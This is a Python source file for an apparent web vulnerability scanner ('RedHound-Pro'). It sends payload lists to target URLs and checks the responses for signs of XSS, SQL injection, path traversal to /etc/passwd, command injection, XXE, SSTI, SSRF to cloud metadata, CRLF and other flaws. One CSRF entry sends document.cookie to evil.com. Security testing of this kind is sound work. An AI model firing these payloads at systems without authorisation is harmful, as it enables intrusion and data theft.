import requests
import time
import re

class PayloadEngine:
    def __init__(self, socketio=None):
        self.socketio = socketio
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'RedHound-Pro/2.0'})
        
        self.payloads = {
            "xss": [
                "<script>alert('RH_XSS_9x7')</script>",
                "<img src=x onerror=alert('RH_XSS_9x7')>",
                "javascript:alert('RH_XSS_9x7')",
                "<svg onload=alert('RH_XSS_9x7')>"
            ],
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' AND SLEEP(3)--"
            ],
            "lfi": [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "....//....//....//etc/passwd"
            ],
            "rce": [
                "; echo RH_RCE_CHECK_7x9",
                "| echo RH_RCE_CHECK_7x9",
                "&& echo RH_RCE_CHECK_7x9"
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
            ],
            "ssti": [
                "{{77*77}}",
                "${77*77}",
                "<%= 77*77 %>"
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:22"
            ],
            "open_redirect": [
                "//google.com",
                "https://google.com"
            ],
            "crlf": [
                "%0d%0aSet-Cookie:RH_CRLF=1",
                "%0aSet-Cookie:RH_CRLF=1"
            ],
            "nosqli": [
                "{'$ne': ''}",
                '{"$gt": ""}',
                "[$ne]=1"
            ],
            "idor": ["1", "2", "0", "admin", "../1"],
            "csrf": [
                "<img src=http://evil.com/steal?c=document.cookie>"
            ],
            "jwt": [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0."
            ],
            "graphql": [
                "{__schema{types{name}}}",
                "{__typename}"
            ],
            "api_key": [
                "api_key=test",
                "token=test"
            ],
            "ldap": [
                "*)(uid=*",
                "admin*"
            ],
            "cmd_injection": [
                "; ls",
                "| ls",
                "&& ls"
            ]
        }
    
    def has_payloads(self, vuln_type):
        return vuln_type in self.payloads
    
    def send_request(self, url, payload):
        try:
            if 'FUZZ' in url:
                full_url = url.replace('FUZZ', requests.utils.quote(payload, safe=''))
            else:
                sep = '&' if '?' in url else '?'
                full_url = url + sep + 'q=' + requests.utils.quote(payload, safe='')
            
            r = self.session.get(full_url, timeout=5, allow_redirects=True)
            return {
                'text': r.text,
                'status_code': r.status_code,
                'headers': dict(r.headers),
                'url': r.url,
                'history': [h.status_code for h in r.history]
            }
        except requests.exceptions.Timeout:
            return {'text': '', 'status_code': 0, 'headers': {}, 'url': url, 'history': [], 'timed_out': True}
        except Exception:
            return {'text': '', 'status_code': 500, 'headers': {}, 'url': url, 'history': []}
    
    def test(self, url, vuln_type):
        findings = []
        for payload in self.payloads.get(vuln_type, []):
            response = self.send_request(url, payload)
            
            service_info = self.detect_service(response.get('headers', {}))
            
            if self.check_vulnerability(response, vuln_type, payload):
                findings.append({
                    'vulnerable': True,
                    'type': vuln_type,
                    'payload': payload[:100],
                    'url': url,
                    'severity': self.get_severity(vuln_type),
                    'status_code': response.get('status_code', 0),
                    'response_text': response.get('text', '')[:500],
                    'service_info': service_info
                })
                break
        return findings
    
    def detect_service(self, headers):
        server = headers.get('Server', '').lower()
        x_powered = headers.get('X-Powered-By', '').lower()
        
        if 'nginx' in server:
            return {'name': 'nginx', 'version': 'unknown', 'vendor': 'nginx'}
        elif 'apache' in server:
            return {'name': 'apache', 'version': 'unknown', 'vendor': 'apache'}
        elif 'iis' in server:
            return {'name': 'iis', 'version': 'unknown', 'vendor': 'microsoft'}
        elif 'php' in x_powered:
            return {'name': 'php', 'version': 'unknown', 'vendor': 'php'}
        
        return {'name': 'unknown', 'version': 'unknown', 'vendor': 'unknown'}
    
    def check_vulnerability(self, response, vuln_type, payload=''):
        text = response.get('text', '')
        text_lower = text.lower()
        
        if vuln_type == "xss":
            return "RH_XSS_9x7" in text
        
        if vuln_type == "sqli":
            error_patterns = [
                "sql syntax", "mysql_fetch", "unclosed quotation",
                "postgresql", "ora-", "sqlite"
            ]
            if any(p in text_lower for p in error_patterns):
                return True
            if response.get('timed_out') and 'SLEEP' in payload.upper():
                return True
            return False
        
        if vuln_type == "lfi":
            return bool(re.search(r'root:x:0:0:', text)) or "bin/bash" in text
        
        if vuln_type == "rce":
            return "RH_RCE_CHECK_7x9" in text or "uid=" in text_lower
        
        if vuln_type == "xxe":
            return bool(re.search(r'root:x:0:0:', text))
        
        if vuln_type == "ssti":
            return "5929" in text
        
        if vuln_type == "ssrf":
            return "ami-id" in text_lower or "instance-id" in text_lower
        
        if vuln_type == "open_redirect":
            return len(response.get('history', [])) > 0 and 'google.com' in response.get('url', '')
        
        if vuln_type == "crlf":
            headers = response.get('headers', {})
            set_cookie = headers.get('Set-Cookie', '')
            return 'RH_CRLF' in set_cookie
        
        if vuln_type == "graphql":
            return "__schema" in text or "__typename" in text
        
        return False
    
    def get_severity(self, vuln_type):
        sev = {
            'xss': 'Medium', 'sqli': 'Critical', 'lfi': 'High',
            'rce': 'Critical', 'xxe': 'High', 'ssti': 'Critical',
            'ssrf': 'High', 'open_redirect': 'Low', 'crlf': 'Medium',
            'nosqli': 'High', 'idor': 'Medium', 'csrf': 'Medium',
            'jwt': 'High', 'graphql': 'Medium', 'api_key': 'High',
            'ldap': 'High', 'cmd_injection': 'Critical'
        }
        return sev.get(vuln_type, 'Medium')
